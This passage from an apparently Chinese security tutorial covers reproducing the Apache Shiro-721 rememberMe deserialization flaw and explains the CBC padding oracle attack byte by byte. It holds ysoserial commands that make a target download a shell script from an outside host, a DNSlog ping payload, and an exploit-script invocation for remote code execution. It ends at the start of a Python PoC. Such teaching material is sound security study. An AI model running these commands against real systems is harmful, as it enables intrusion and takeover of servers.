<p><strong>9 发送更改后的数据包 查看监听端是否成功反弹shell</strong></p>
<p>或者把反弹shell的命令写道一个shell脚本中</p>
<p>执行<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 11111 CommonsCollections4 &quot;curl http://171.16.1.105/zsy.sh -o /tmp/zsy.sh&quot;</code></p>
<p>也可以直接利用一体化工具：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503051811205.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-03-01 122418"></p>
<h2 id="六、Shiro-721漏洞原理"><a href="#六、Shiro-721漏洞原理" class="headerlink" title="六、Shiro-721漏洞原理"></a>六、Shiro-721漏洞原理</h2><p>使用随机生成的 AES 密钥</p>
<p>漏洞成因：Apache Shiro 的 RememberMe 功能使用 <strong>AES-128-CBC 模式</strong> 对 Cookie 中的 <code>rememberMe</code> 字段进行加密。由于 CBC 模式在解密时会对填充（Padding）格式进行校验，攻击者可通过 <strong>Padding Oracle 攻击</strong> 探测填充有效性差异，逐步破解加密密钥或构造恶意密文。</p>
<p>关键缺陷</p>
<ul>
<li><strong>CBC 模式漏洞</strong>：CBC 加密的初始化向量（IV）直接暴露在 Cookie 中（Base64 解码后前 16 字节），且服务器会因填充错误返回差异化的响应（如 HTTP 500）</li>
<li><strong>密钥生成问题</strong>：Shiro ≤1.4.1 使用随机生成的 AES 密钥（非硬编码），但仍可通过 Padding Oracle 攻击动态破解</li>
</ul>
<p>影响版本：&lt;&#x3D;1.4.1</p>
<h4 id="条件：一个有效的-Cookie（需用户已登录）"><a href="#条件：一个有效的-Cookie（需用户已登录）" class="headerlink" title="条件：一个有效的 Cookie（需用户已登录）"></a>条件：一个有效的 Cookie（需用户已登录）</h4><h4 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a><strong>攻击流程</strong></h4><ol>
<li><p>获取合法 Cookie</p>
<ul>
<li>攻击者需先获取一个有效的 <code>rememberMe</code> Cookie（需用户已登录）</li>
</ul>
</li>
<li><p>Padding Oracle 攻击</p>
<ul>
<li>利用服务器的填充错误响应，构造恶意请求，逐步破解 AES 密钥或生成符合 CBC 填充规则的密文块。</li>
</ul>
</li>
<li><p>构造反序列化载荷</p>
<ul>
<li>将恶意序列化数据（如 CommonsCollections 利用链）加密后替换到 <code>rememberMe</code> 字段，触发服务端反序列化，最终执行任意代码</li>
</ul>
<p>Padding正确，服务器正常响应</p>
<p>Padding错误，服务器返回<code>Set-Cookie: rememberMe=deleteMe</code></p>
</li>
</ol>
<h2 id="七、Shiro-721复现"><a href="#七、Shiro-721复现" class="headerlink" title="七、Shiro-721复现"></a>七、Shiro-721复现</h2><ol>
<li><strong>获取 <code>rememberMe</code> cookie</strong></li>
</ol>
<ul>
<li>在目标应用的登录页面中，输入有效的用户名和密码，勾选 <code>rememberMe</code> 选项。</li>
<li>使用 <strong>Burp Suite</strong> 代理拦截并获取包含加密认证信息的 <code>rememberMe</code> cookie。</li>
</ul>
<ol start="2">
<li><strong>使用 DNSlog 获取临时域名</strong></li>
</ol>
<ul>
<li>在 DNSlog 服务平台（例如 <code>dnslog.cn</code>）注册并获取一个临时的域名（如 <code>1075l1.dnslog.cn</code>）。</li>
<li>攻击者利用此域名用于验证漏洞是否被成功利用（目标系统会向该域名发送 DNS 请求）。</li>
</ul>
<ol start="3">
<li><strong>使用 <code>ysoserial</code> 生成攻击载荷</strong></li>
</ol>
<ul>
<li><p>使用 <code>ysoserial</code> 工具生成恶意的反序列化对象。<code>ysoserial</code> 是一个用于构造 Java 反序列化漏洞利用链的工具。</p>
</li>
<li><p>选择 <code>CommonsBeanutils1</code> 作为攻击链，并将命令（如 <code>ping 1075l1.dnslog.cn</code>）嵌入 payload 中。</p>
</li>
<li><p>执行命令生成 payload.class文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar ysoserial.jar CommonsBeanutils1 <span class="hljs-string">&quot;ping 1075l1.dnslog.cn&quot;</span> &gt; payload.class<br></code></pre></td></tr></table></figure></li>
</ul>
<ol start="4">
<li><strong>通过 Padding Oracle 攻击解密并篡改 <code>rememberMe</code></strong></li>
</ol>
<ul>
<li>利用获取到的 <code>rememberMe</code> cookie 值作为前缀，结合生成的 payload 进行 Padding Oracle 攻击。</li>
<li>Padding Oracle 攻击利用了加密算法的填充机制，通过错误响应信息逐步破解加密内容。</li>
</ul>
<ol start="5">
<li><strong>执行攻击脚本触发 RCE</strong></li>
</ol>
<ul>
<li><p>使用 <code>shiro_exp.py</code> 脚本触发最终的攻击，执行远程命令。</p>
</li>
<li><p>输入目标 URL、<code>rememberMe</code> cookie 和生成的 <code>payload.class</code> 文件，通过 Python 脚本触发反序列化攻击：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python shiro_exp.py http://&lt;目标 IP&gt;:&lt;端口&gt; [rememberMeCookie] payload.class<br></code></pre></td></tr></table></figure>
</li>
<li><p>脚本会利用 <code>rememberMe</code> cookie 和攻击载荷，进行反序列化操作，从而执行命令（如 <code>ping</code>）来确认攻击是否成功。</p>
</li>
</ul>
<h3 id="Padding-Oracle-Attack-原理"><a href="#Padding-Oracle-Attack-原理" class="headerlink" title="Padding Oracle Attack 原理"></a>Padding Oracle Attack 原理</h3><h4 id="1、根源"><a href="#1、根源" class="headerlink" title="1、根源"></a><strong>1、根源</strong></h4><p>这个攻击的根源是明文分组和填充，同时应用程序对于填充异常的响应可以作为反馈，例如请求<code>http://www.example.com/decrypt.jsp?data=0000000000000000EFC2807233F9D7C097116BB33E813C5E</code>，当攻击者在篡改data值时会有以下不同的响应：</p>
<ul>
<li>如果data值没有被篡改，则解密成功，并且业务校验成功，响应200</li>
<li>如果data值被篡改，服务端无法完成解密，解密校验失败，则响应500</li>
<li>如果data值被篡改，但是服务端解密成功，但业务逻辑校验失败，则可能返回200或302等响应码,而不是响应500</li>
</ul>
<p>攻击者只需要关注解密成功和解密失败的响应即可（第三种属于解密成功的响应），即可完成攻击</p>
<h4 id="2、破解明文"><a href="#2、破解明文" class="headerlink" title="2、破解明文"></a><strong>2、破解明文</strong></h4><p>以一个例子进行猜解，假设有这样一个应用，请求如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-attr">http</span>:<span class="hljs-comment">//www.example.com/decrypt.jsp?data=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</span><br></code></pre></td></tr></table></figure>

<p>即client给server提交的参数为<code>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</code> 才能请求正常的服务</p>
<h5 id="（1）上帝视角"><a href="#（1）上帝视角" class="headerlink" title="（1）上帝视角"></a><strong>（1）上帝视角</strong></h5><p>加密过程</p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071847462.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>解密过程</p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845580.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>关注上图绿色圈起来的部分，解密之后的最后一个数据块，其结尾应该包含正确的填充序列。如果这点没有满足，那么加&#x2F;解密程序就会抛出一个填充异常。Padding Oracle Attack的关键就是利用程序是否抛出异常来判断padding是否正确。</p>
<h5 id="（2）攻击者视角"><a href="#（2）攻击者视角" class="headerlink" title="（2）攻击者视角"></a><strong>（2）攻击者视角</strong></h5><p>现在让我们来看看在不知道明文的情况下，如何猜解出明文。首先我们将密文分组，前面8个字节为初始化向量，后面16个字节为加密后的数据：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">初始化向量：7B  <span class="hljs-number">21</span>  6A  <span class="hljs-number">63</span>  <span class="hljs-number">49</span>  <span class="hljs-number">51</span>  <span class="hljs-number">17</span>  0F<br>第一组密文：<span class="hljs-variable constant_">F8</span>  <span class="hljs-number">51</span>  <span class="hljs-variable constant_">D6</span>  <span class="hljs-variable constant_">CC</span>  <span class="hljs-number">68</span>  <span class="hljs-variable constant_">FC</span>  <span class="hljs-number">95</span>  <span class="hljs-number">37</span><br>第二组密文：<span class="hljs-number">85</span>  <span class="hljs-number">87</span>  <span class="hljs-number">95</span>  <span class="hljs-variable constant_">A2</span>  8E  <span class="hljs-variable constant_">D4</span>  <span class="hljs-variable constant_">AA</span>  <span class="hljs-variable constant_">C6</span><br></code></pre></td></tr></table></figure>

<p>我们来看如何通过构造前面初始向量来破解第一组密文：<code>http://www.example.com/decrypt.jsp?data=7B216A634951170FF851D6CC68FC9537</code></p>
<ul>
<li>将初始化向量全部设置为0，提交如下请求<code>http://www.example.com/decrypt.jsp?data=00000000000000000F851D6CC68FC9537</code> ，服务器势必会解密失败，返回HTTP 500，那是因为在对数据进行解密的时候，明文最后一个字节的填充是<code>0x3D</code>,不满足填充规则，校验失败，此时示意图如下：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845769.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li>依次将初始化向量最后一个字节从<code>0x01~0xFF</code>递增，直到解密的明文最后一个字节为<code>0x01</code>，成为一个正确的padding，当初始化向量为<code>000000000000003C</code>时，成功了，服务器返回HTTP 200，解密示意图如下：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845703.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li>我们已知构造成功的IV最后一个字节为<code>0x3C</code>，最后一个填充字符为<code>0x01</code>，则我们能通过XOR计算出，第一组密文解密后的中间值最后一个字节：<code>0x01 xor 0x3C = 0x3D</code>; 重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当前解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值的最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值</li>
<li>下面我们将构造填充值为<code>0x02 0x02</code>的场景，即存在2个填充字节，填充值为<code>0x02</code>，此时我们已经知道了中间值得最后一位为<code>0x3D</code>,计算出初始向量的最后一位为 <code>0x3D xor 0x02 = 0x3F</code>, 即初始向量为<code>0000000000000003F</code>，遍历倒数第二个字节从<code>0x00~0xFF</code>，直到响应成功，猜解出中间值得后两个字节分别为 <code>0x26 0x3D</code>，示例图如下：</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845760.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li>通过同样的方式，完成第一组密文中间值的猜解</li>
</ul>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845764.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li>当第一组密文的中间值猜解成功后，我们将中间值和已知的IV做异或，则得到第一组密文的明文</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-number">0x39</span> <span class="hljs-number">0x73</span> <span class="hljs-number">0x23</span> <span class="hljs-number">0x22</span> <span class="hljs-number">0x07</span> <span class="hljs-number">0x6A</span> <span class="hljs-number">0x26</span> <span class="hljs-number">0x3D</span> <br>xor <br><span class="hljs-number">0x7B</span> <span class="hljs-number">0x21</span> <span class="hljs-number">0x6A</span> <span class="hljs-number">0x63</span> <span class="hljs-number">0x49</span> <span class="hljs-number">0x51</span> <span class="hljs-number">0x17</span> <span class="hljs-number">0x0F</span><br>= <br><span class="hljs-variable constant_">BRIAN</span>;<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure>

<ul>
<li>续破解第二组密文，第二组密文的IV向量是第一组密文，按照上述的逻辑构造第一组密文，即可破解出第二组明文</li>
</ul>
<h4 id="3、伪造密文"><a href="#3、伪造密文" class="headerlink" title="3、伪造密文"></a><strong>3、伪造密文</strong></h4><p>我们已经知道了中间值，那么只需传递指定的IV，就能制造任意想要的密文，如加密<code>TEST</code>：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503071845270.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h4 id="4、脚本"><a href="#4、脚本" class="headerlink" title="4、脚本"></a><strong>4、脚本</strong></h4><h5 id="（1）perl"><a href="#（1）perl" class="headerlink" title="（1）perl"></a><strong>（1）perl</strong></h5><p><a target="_blank" rel="noopener" href="https://github.com/AonCyberLabs/PadBuster">https://github.com/AonCyberLabs/PadBuster</a></p>
<h5 id="（2）python2"><a href="#（2）python2" class="headerlink" title="（2）python2"></a><strong>（2）python2</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Padding Oracle Attack POC(CBC-MODE)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Author: axis(axis@ph4nt0m.org)</span><br><span class="hljs-string"></span><br><span class="hljs-string">    http://hi.baidu.com/aullik5</span><br><span class="hljs-string"></span><br><span class="hljs-string">    2011.9</span><br><span class="hljs-string"></span><br><span class="hljs-string"> </span><br><span class="hljs-string"></span><br><span class="hljs-string">    This program is based on Juliano Rizzo and Thai Duong&#x27;s talk on </span><br><span class="hljs-string"></span><br><span class="hljs-string">    Practical Padding Oracle Attack.(http://netifera.com/research/)</span><br><span class="hljs-string"></span><br><span class="hljs-string"> </span><br><span class="hljs-string"></span><br><span class="hljs-string">    For Education Purpose Only!!!</span><br><span class="hljs-string"></span><br><span 